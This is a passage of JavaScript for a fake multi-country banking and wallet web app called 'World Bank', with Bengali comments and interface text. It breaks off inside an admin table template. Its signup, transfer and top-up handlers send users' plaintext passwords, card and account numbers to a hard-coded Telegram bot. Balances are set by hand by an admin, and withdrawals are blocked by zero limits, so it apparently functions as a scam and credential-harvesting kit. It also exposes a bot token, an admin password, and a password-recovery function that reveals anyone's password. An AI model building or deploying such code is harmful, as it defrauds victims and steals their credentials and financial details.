// ১. ফায়ারবেস কনফিগারেশন URL ও টেলিগ্রাম ক্রেডেনশিয়ালস
const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";

// এডমিন সিকিউরিটি পাসওয়ার্ড
const ADMIN_SECURITY_PASS = "worldbank1234@#";

// কান্ট্রি কোড ও কারেন্সি ম্যাপার
const countryCurrencyMap = {
    "+880": "৳",
    "+60": "MYR",
    "+966": "SAR",
    "+65": "SGD $",
    "+971": "AED",
    "+1": "USD $",
    "+91": "INR ₹",
    "+44": "GBP £",
    "+974": "QAR",
    "+968": "OMR",
    "+965": "KWD",
    "+973": "BHD"
};

// দেশভিত্তিক জনপ্রিয় পেমেন্ট পোরটালের ডাটাবেস
const countrySpecificBanks = {
    "+880": ["bKash (BD)", "Nagad (BD)", "Rocket (BD)", "Upay (BD)", "DBBL Bank (BD)", "IBBL Bank (BD)", "City Bank (BD)"],
    "+60": ["Maybank (Malaysia)", "CIMB Bank (Malaysia)", "Public Bank (Malaysia)", "RHB Bank (Malaysia)", "Touch 'n Go eWallet"],
    "+966": ["Al Rajhi Bank (Saudi)", "SNB AlAhli (Saudi)", "Riyad Bank (Saudi)", "STC Pay (Saudi)"],
    "+65": ["DBS Bank (Singapore)", "OCBC Bank (Singapore)", "UOB Bank (Singapore)", "POSB Bank (Singapore)", "PayNow (Singapore)"],
    "+971": ["Emirates NBD (UAE)", "First Abu Dhabi Bank (UAE)", "Mashreq Bank (UAE)", "e& money (UAE)"],
    "+1": ["Bank of America (USA)", "Chase Bank (USA)", "Wells Fargo (USA)", "Zelle / Venmo (USA)"],
    "+91": ["Paytm / PhonePe (India)", "GPay / UPI (India)", "State Bank of India", "HDFC Bank (India)"],
    "+44": ["Barclays (UK)", "HSBC (UK)", "Lloyds Bank (UK)", "Revolut (UK)"]
};

const defaultBalances = {
    WorldBank: 0.00,
    bKash: 0.00,
    Nagad: 0.00,
    Rocket: 0.00
};

let usersDatabase = [];
let bannedEmails = [];
let allTransactions = [];
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';
let tempProfilePhotoBase64 = null;

// কারেন্সি অটো ডিটেকশন (নম্বর বা অবজেক্ট থেকে)
function getUserCurrency(user) {
    if (!user) return '৳';
    if (user.currency) return user.currency;

    if (user.phone) {
        const matched = user.phone.match(/\+\d+/);
        if (matched && countryCurrencyMap[matched[0]]) {
            return countryCurrencyMap[matched[0]];
        }
    }
    return '৳';
}

// সংখ্যা রূপান্তরকারক
function formatAmountLocale(amount) {
    const num = parseFloat(amount || 0).toFixed(2);
    if (currentLang === 'bn') {
        const bnDigits = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
        return num.toString().replace(/[0-9]/g, w => bnDigits[w]);
    }
    return num;
}

// কাস্টম পপ-আপ অ্যালার্ট
function showCustomAlert(title, message) {
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    document.getElementById('customAlertModal').classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal').classList.add('hidden');
}

function sanitizeEmailKey(keyStr) {
    return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

// ক্লাউড ফায়ারবেস সিঙ্ক
async function syncFromFirebase() {
    try {
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => u.email === activeUser.email || u.phone === activeUser.phone);
                if (refreshedUser) {
                    activeUser = refreshedUser;
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                }
            }
        } else {
            usersDatabase = [];
        }

        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
        const bData = await bRes.json();
        if (bData) {
            bannedEmails = Object.values(bData);
            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        } else {
            bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        }

    } catch(err) {
        console.error("Firebase sync error:", err);
        usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
        bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
        allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    await syncFromFirebase();
    
    if (activeUser) {
        const refreshedUser = usersDatabase.find(u => u.email === activeUser.email || u.phone === activeUser.phone);
        if (refreshedUser) {
            activeUser = refreshedUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        
        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanks();
    }
});

// উইথড্র ও ডিপোজিট ফর্মে সরাসরি স্মুথ স্ক্রোলিং ও হাইলাইট ফিক্স
function scrollToAction(type) {
    let targetId = type === 'Withdraw' ? 'withdrawFormBox' : 'depositFormBox';
    let targetEl = document.getElementById(targetId);

    if (targetEl) {
        targetEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
        targetEl.classList.add('highlight');
        setTimeout(() => {
            targetEl.classList.remove('highlight');
        }, 1500);
    }
}

// ইউজার দেশ অনুযায়ী ডাইনামিক পেমেন্ট ব্যাংক রেন্ডার
function populateUserDynamicBanks() {
    const depSelect = document.getElementById('depositMethodSelect');
    const wdSelect = document.getElementById('withdrawMethodSelect');

    if (!depSelect || !wdSelect) return;

    let countryCode = "+880";
    if (activeUser && activeUser.phone) {
        const matched = activeUser.phone.match(/\+\d+/);
        if (matched) countryCode = matched[0];
    }

    const localBanks = countrySpecificBanks[countryCode] || [];
    const bdDefaultBanks = countrySpecificBanks["+880"];

    let combinedBanks = Array.from(new Set(["WorldBank", ...localBanks, ...bdDefaultBanks, "International Wire Transfer"]));

    depSelect.innerHTML = `<option value="">মেথড বা ব্যাংক সিলেক্ট করুন</option>`;
    wdSelect.innerHTML = `<option value="">কোথা থেকে উইথড্র করবেন?</option>`;

    combinedBanks.forEach(b => {
        depSelect.innerHTML += `<option value="${b}">${b}</option>`;
        wdSelect.innerHTML += `<option value="${b}">${b}</option>`;
    });
}

function updateAvatarDisplay() {
    const avatarEl = document.getElementById('userAvatarDisp');
    if (activeUser && activeUser.photo) {
        avatarEl.style.backgroundImage = `url(${activeUser.photo})`;
        avatarEl.innerText = '';
    } else {
        avatarEl.style.backgroundImage = 'none';
        avatarEl.innerText = '👤';
    }
}

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    showCustomAlert("সফল", currentLang === 'bn' ? 'ডাটাবেস রিফ্রেশ হয়েছে!' : 'Database refreshed!');
}

async function saveUserToFirebase(user) {
    const userKey = sanitizeEmailKey(user.email || user.phone);
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) {
        console.error("User save error:", err);
    }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) {
        console.error("Transaction save error:", err);
    }
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = '🙈';
    } else {
        input.type = 'password';
        btn.innerText = '👁️';
    }
}

function openTopUpModal() {
    document.getElementById('topUpModal').classList.toggle('hidden');
}

function openCardBankModal() {
    document.getElementById('cardBankModal').classList.toggle('hidden');
}

function toggleForgotModal() {
    document.getElementById('forgotModal').classList.toggle('hidden');
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();

    const user = usersDatabase.find(u => (u.email === email || u.phone === phone) || (u.email === email && u.phone.includes(phone)));

    if (user) {
        showCustomAlert("রিকভারি সফল", currentLang === 'bn' 
            ? `আপনার পাসওয়ার্ড: ${user.password}`
            : `Your Password: ${user.password}`);
        toggleForgotModal();
    } else {
        showCustomAlert("ত্রুটি", currentLang === 'bn' 
            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি পাওয়া যায়নি!'
            : 'Entered email or phone number not found!');
    }
}

function handleCountryChange(selectEl) {
    const selectedOption = selectEl.options[selectEl.selectedIndex];
    const nativeLang = selectedOption.getAttribute('data-lang') || 'bn';
    setLanguage(nativeLang);
}

function setLanguage(lang) {
    currentLang = lang;
    document.getElementById('btnLangBN').classList.toggle('active', lang !== 'en');
    document.getElementById('btnLangEN').classList.toggle('active', lang === 'en');
    
    const dashLangBtn = document.getElementById('dashLangBtn');
    if (dashLangBtn) dashLangBtn.innerText = lang === 'en' ? 'EN' : 'NA';

    document.querySelectorAll('[data-bn]').forEach(el => {
        el.innerText = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-bn');
    });

    document.querySelectorAll('[data-bn-ph]').forEach(el => {
        el.placeholder = lang === 'en' ? el.getAttribute('data-en-ph') : el.getAttribute('data-bn-ph');
    });

    renderBalances();
}

function switchTab(type) {
    document.getElementById('errorText').style.display = 'none';
    if(type === 'login') {
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('signUpForm').classList.add('hidden');
        document.getElementById('loginTab').classList.add('active');
        document.getElementById('signUpTab').classList.remove('active');
    } else {
        document.getElementById('signUpForm').classList.remove('hidden');
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('signUpTab').classList.add('active');
        document.getElementById('loginTab').classList.remove('active');
    }
}

function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

// সাইন আপ ফাংশন
async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value;
    const email = document.getElementById('regEmail').value;
    const countryCodeSelect = document.getElementById('regCountryCode');
    const rawPhone = document.getElementById('regPhone').value;
    const password = document.getElementById('regPass').value;

    const fullPhone = countryCodeSelect.value + " " + rawPhone;
    const currency = countryCodeSelect.options[countryCodeSelect.selectedIndex].getAttribute('data-currency') || '৳';

    await syncFromFirebase();

    if (bannedEmails.includes(email) || bannedEmails.includes(fullPhone)) {
        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'এই অ্যাকাউন্টটি ব্ল্যাকলিস্টেড।' : 'This account is blacklisted.');
        return;
    }

    const exists = usersDatabase.some(u => u.email === email || u.phone === fullPhone);
    if(exists) {
        showCustomAlert("সতর্কতা", currentLang === 'bn' ? 'এই ইমেইল বা ফোন দিয়ে আগেই অ্যাকাউন্ট রয়েছে!' : 'An account already exists with this email or phone!');
        return;
    }

    const newUser = {
        name,
        email,
        phone: fullPhone,
        currency: currency,
        password,
        photo: null,
        totalBalance: 0.00,
        withdrawLimit: 0.00,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👤 <b>World Bank নতুন সাইন আপ!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${fullPhone}\n💱 কারেন্সি: ${currency}\n🔑 পাসওয়ার্ড: ${password}`);

    showCustomAlert("সফল", currentLang === 'bn' ? 'অ্যাকাউন্ট তৈরি হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
    switchTab('login');
    document.getElementById('signUpForm').reset();
}

// লগইন
async function handleLogin(e) {
    e.preventDefault();
    const inputAcc = document.getElementById('logEmail').value.trim();
    const password = document.getElementById('logPass').value;

    await syncFromFirebase();

    if (bannedEmails.includes(inputAcc)) {
        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'আপনার অ্যাকাউন্টটি ব্লক করা হয়েছে!' : 'Your account is blocked!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => (u.email === inputAcc || u.phone === inputAcc || u.phone.includes(inputAcc)) && u.password === password);

    if(userIndex !== -1) {
        activeUser = usersDatabase[userIndex];
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };

        if (!activeUser.currency) {
            activeUser.currency = getUserCurrency(activeUser);
        }

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        document.getElementById('errorText').style.display = 'none';

        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanks();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;

    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const rawBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : (activeUser.balances ? activeUser.balances.WorldBank : 0.00);
    const showBal = formatAmountLocale(rawBal);
    const curr = getUserCurrency(activeUser);
    
    pillText.innerText = `${curr} ${showBal}`;

    balanceHideTimer = setTimeout(() => {
        pillText.innerText = "Tap for Balance";
    }, 3000);
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    const symbolEl = document.getElementById('dashCurrencySymbol');
    const userCurr = getUserCurrency(activeUser);
    
    if (symbolEl && activeUser) symbolEl.innerText = userCurr;
    if (pillText) pillText.innerText = "Tap for Balance";
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm').reset();
}

function previewProfilePhoto(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            tempProfilePhotoBase64 = event.target.result;
            const prev = document.getElementById('profileImagePreview');
            prev.style.backgroundImage = `url(${tempProfilePhotoBase64})`;
            prev.innerText = '';
        };
        reader.readAsDataURL(file);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
        
        const prev = document.getElementById('profileImagePreview');
        if (activeUser.photo) {
            prev.style.backgroundImage = `url(${activeUser.photo})`;
            prev.innerText = '';
        } else {
            prev.style.backgroundImage = 'none';
            prev.innerText = '👤';
        }
    }
}

async function openInboxModal() {
    await syncFromFirebase();
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;

    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.phone = document.getElementById('profPhoneInput').value;
    activeUser.password = document.getElementById('profPassInput').value;

    if (tempProfilePhotoBase64) {
        activeUser.photo = tempProfilePhotoBase64;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === activeUser.email || u.phone === activeUser.phone);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        await saveUserToFirebase(activeUser);
    }

    document.getElementById('userPhoneDisp').innerText = activeUser.phone;
    updateAvatarDisplay();

    showCustomAlert("সফল", currentLang === 'bn' ? 'প্রোফাইল ছবি ও তথ্য আপডেট করা হয়েছে!' : 'Profile updated successfully!');
    toggleProfileModal();
}

async function handleTopUpSubmit(e) {
    e.preventDefault();
    const operator = document.getElementById('topUpOperatorSelect').value;
    const phone = document.getElementById('topUpPhoneInput').value;
    const amount = parseFloat(document.getElementById('topUpAmountInput').value);

    if (!operator || !phone || isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userCurr = getUserCurrency(activeUser);
    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email || activeUser.phone,
        userName: activeUser.name,
        type: 'TopUp',
        method: operator,
        phone: phone,
        amount: amount,
        currency: userCurr,
        trxId: 'TOPUP_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`📱 <b>World Bank মোবাইল টপ আপ রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📡 অপারেটর: ${operator}\n📱 নম্বর: ${phone}\n💰 পরিমাণ: ${userCurr}${amount}`);

    showCustomAlert("সফল রিকোয়েস্ট", currentLang === 'bn' ? 'আপনার মোবাইল টপ আপ প্রসেসিং-এ রয়েছে।' : 'Your mobile top up is processing.');

    e.target.reset();
    openTopUpModal();
}

async function handleCardBankSubmit(e) {
    e.preventDefault();
    const type = document.getElementById('cardBankTypeSelect').value;
    const cardAcc = document.getElementById('cardBankAccInput').value;
    const receiverPhone = document.getElementById('cardBankReceiverInput').value;
    const amount = parseFloat(document.getElementById('cardBankAmountInput').value);

    if (!type || !cardAcc || !receiverPhone || isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userCurr = getUserCurrency(activeUser);
    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email || activeUser.phone,
        userName: activeUser.name,
        type: 'Card/Bank Transfer',
        method: type,
        phone: `Acc: ${cardAcc} -> ${receiverPhone}`,
        amount: amount,
        currency: userCurr,
        trxId: 'TRX_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`💳 <b>World Bank কার্ড/ব্যাংক ট্রান্সফার রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📌 টাইপ: ${type}\n💳 নম্বর: ${cardAcc}\n💰 পরিমাণ: ${userCurr}${amount}`);

    showCustomAlert("সফল রিকোয়েস্ট", currentLang === 'bn' ? 'আপনার ট্রান্সফার রিকোয়েস্ট সফলভাবে জমা হয়েছে।' : 'Your transfer request was submitted successfully.');

    e.target.reset();
    openCardBankModal();
}

async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;

    if (isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", 'সঠিক পরিমাণ দিন!');
        return;
    }

    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : 0.00;
    const userCurr = getUserCurrency(activeUser);

    if (type === 'Withdraw' && amount > userLimit) {
        const limitMsg = currentLang === 'bn' 
            ? `আপনার উইথড্র লিমিট ${userCurr}${formatAmountLocale(userLimit)}-এর বেশি অনুমোদিত নয়।`
            : `Your limit is ${userCurr}${formatAmountLocale(userLimit)}. Request exceeds allowed limit.`;
        showCustomAlert("লিমিট অতিক্রম", limitMsg);
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email || activeUser.phone,
        userName: activeUser.name,
        type: type,
        method: method,
        phone: phone,
        amount: amount,
        currency: userCurr,
        trxId: trxId,
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`⏳ <b>World Bank ${type} রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n🏦 মেথড: ${method}\n📱 নম্বর: ${phone}\n💰 পরিমাণ: ${userCurr}${amount}\n🆔 TrxID: ${trxId}`);

    showCustomAlert("সফল রিকোয়েস্ট", currentLang === 'bn' ? `আপনার ${type} রিকোয়েস্ট পেন্ডিং হিসেবে গৃহীত হয়েছে।` : `Your ${type} request is pending.`);

    form.reset();
    scrollToTop();
}

function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.email || t.userEmail === activeUser.phone);

    if (myTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">কোনো রেকর্ড পাওয়া যায়নি।</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const curr = t.currency || getUserCurrency(activeUser);

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="color:#0f172a !important; font-weight: bold;">${t.dateStr} ${t.timeStr}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.type}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.method}</td>
            <td style="color:#be123c !important; font-weight: bold;">${curr} ${formatAmountLocale(t.amount)}</td>
            <td style="color:#0f172a !important; font-weight: bold;"><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function toggleAdminModal() {
    document.getElementById('adminModal').classList.toggle('hidden');
}

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        
        await syncFromFirebase();
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        showCustomAlert("ত্রুটি", 'ভুল পাসওয়ার্ড!');
    }
}

async function adminDeleteUser(userIdentifier) {
    if (!confirm(`আপনি কি নিশ্চিতভাবে ${userIdentifier}-কে ডিলিট এবং ব্যান করতে চান?`)) {
        return;
    }

    usersDatabase = usersDatabase.filter(u => u.email !== userIdentifier && u.phone !== userIdentifier);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));

    try {
        const userKey = sanitizeEmailKey(userIdentifier);
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, { method: 'DELETE' });
    } catch(err) {
        console.error("User delete firebase error:", err);
    }

    if (!bannedEmails.includes(userIdentifier)) {
        bannedEmails.push(userIdentifier);
        localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
    }

    showCustomAlert("সফল", `ইউজার সফলভাবে ডিলিট ও ব্লক করা হয়েছে!`);
    renderAdminUsersList();
    populateAdminUserSelect();
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userEmail = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);

    if (!userEmail || isNaN(newLimit) || newLimit < 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userEmail || u.phone === userEmail);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        user.withdrawLimit = newLimit;

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        const curr = getUserCurrency(user);
        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর উইথড্র লিমিট ${curr}${formatAmountLocale(newLimit)} করা হয়েছে!`);
        
        document.getElementById('admUserCustomLimitInput').value = '';
        renderAdminUsersList();

        if (activeUser && (activeUser.email === user.email || activeUser.phone === user.phone)) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }
    }
}

function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');

    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার ইমেইল/ফোন সিলেক্ট করুন</option>';

    usersDatabase.forEach(u => {
        const opt1 = document.createElement('option');
        opt1.value = u.email || u.phone;
        opt1.innerText = `${u.name} (${u.phone || u.email})`;
        if (balSelect) balSelect.appendChild(opt1);

        const opt2 = document.createElement('option');
        opt2.value = u.email || u.phone;
        opt2.innerText = `${u.name} (${u.phone || u.email})`;
        if (limSelect) limSelect.appendChild(opt2);
    });
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userIdentifier = document.getElementById('admBalanceUserSelect').value;
    const method = document.getElementById('admBalanceMethodSelect').value;
    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    if (!userIdentifier || isNaN(newAmount) || newAmount < 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userIdentifier || u.phone === userIdentifier);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        if (!user.balances) user.balances = { ...defaultBalances };

        user.balances[method] = newAmount;

        if (method === 'WorldBank') {
            user.totalBalance = newAmount;
        }

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        const curr = getUserCurrency(user);
        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ${curr}${formatAmountLocale(newAmount)} আপডেট করা হয়েছে!`);
        
        renderAdminUsersList();
        
        if (activeUser && (activeUser.email === user.email || activeUser.phone === user.phone)) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
    }
}

async function adminCreateUser(e) {
    e.preventDefault();
    const name = document.getElementById('admUserName').value;
    const email = document.getElementById('admUserEmail').value;
    const countrySelect = document.getElementById('admUserCountryCode');
    const rawPhone = document.getElementById('admUserPhone').value;
    const password = document.getElementById('admUserPass').value;

    const fullPhone = countrySelect.value + " " + rawPhone;
    const currency = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-currency') || '৳';

    if (bannedEmails.includes(email) || bannedEmails.includes(fullPhone)) {
        showCustomAlert("ত্রুটি", 'এই ইমেইল বা ফোনটি ব্ল্যাকলিস্টে রয়েছে!');
        return;
    }

    const exists = usersDatabase.some(u => u.email === email || u.phone === fullPhone);
    if(exists) {
        showCustomAlert("ত্রুটি", 'এই ইমেইল বা ফোন দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
        return;
    }

    const newUser = {
        name,
        email,
        phone: fullPhone,
        currency: currency,
        password,
        photo: null,
        totalBalance: 0.00,
        withdrawLimit: 0.00,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👑 <b>এডমিন কর্তৃক নতুন ইউজার তৈরি!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${fullPhone}\n🔑 পাসওয়ার্ড: ${password}`);

    showCustomAlert("সফল", 'সফলভাবে ইউজার তৈরি হয়েছে!');
    
    document.getElementById('admUserName').value = '';
    document.getElementById('admUserEmail').value = '';
    document.getElementById('admUserPhone').value = '';
    document.getElementById('admUserPass').value = '';

    renderAdminUsersList();
    populateAdminUserSelect();
}

function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (usersDatabase.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" style="text-align:center; color:#94a3b8;">কোনো ইউজার পাওয়া যায়নি।</td></tr>`;
        return;
    }

    usersDatabase.forEach(u => {
        const tr = document.createElement('tr');
        const mainBal = u.totalBalance !== undefined ? u.totalBalance : (u.balances ? u.balances.WorldBank : 0.00);
        const limitBal = u.withdrawLimit !== undefined ? u.withdrawLimit : 0.00;
        const curr = getUserCurrency(u);
        
        let photoHtml = `<div style="width:32px; height:32px; border-radius:50%; background:#334155; display:flex; align-items:center; justify-content:center; font-size:14px;">👤</div>`;
        if (u.photo) {
            photoHtml = `<img src="${u.photo}" style="width:32px; height:32px; border-radius:50%; object-fit:cover; border:1px solid #e2136e;">`;
        }

        tr.innerHTML = `
            <td>${photoHtml}</td>
            <td><b>${u.name || 'N/A'}</b></td>
            <td>${u.email || 'N/A'}<br><small style="color:#94a3b8;">${u.phone || ''}</small></td>
            <td><b style="color:#f59e0b;">${curr}</b></td>
            <td style="color:#f43f5e;"><code>${u.password || 'N/A'}</code></td>
